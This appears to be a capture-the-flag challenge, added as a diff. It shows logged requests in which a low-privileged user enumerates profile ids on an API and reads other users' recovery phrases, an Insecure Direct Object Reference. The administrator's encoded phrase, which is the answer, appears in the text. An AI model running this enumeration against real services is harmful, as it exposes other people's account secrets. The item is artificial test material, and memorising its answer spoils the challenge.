@@ -1,0 +1,20 @@
+Captured while a low-privileged account viewed its own profile, then began
+walking the id in the URL downward, one number at a time.
+
+  GET /api/v2/users/1042/profile        (this is OUR own account)
+  200 OK  {"id":1042,"user":"intern","role":"member","recovery_phrase":"<ours>"}
+
+  GET /api/v2/users/1041/profile
+  200 OK  {"id":1041,"user":"m.diaz","role":"member","recovery_phrase":"..."}
+
+  GET /api/v2/users/1013/profile
+  200 OK  {"id":1013,"user":"a.stone","role":"member","recovery_phrase":"..."}
+
+  GET /api/v2/users/1000/profile
+  200 OK  {"id":1000,"user":"root_admin","role":"superadmin","recovery_phrase":"c2VxdWVudGlhbF9pZHNfbGVhaw=="}
+
+The API hands ANY logged-in user ANY other user's record — it never checks
+that the id belongs to you. That is an Insecure Direct Object Reference
+(IDOR). Find the administrator's record, decode the recovery_phrase it
+exposed, and submit the plaintext.
+Answer format: lowercase, words joined by underscores.
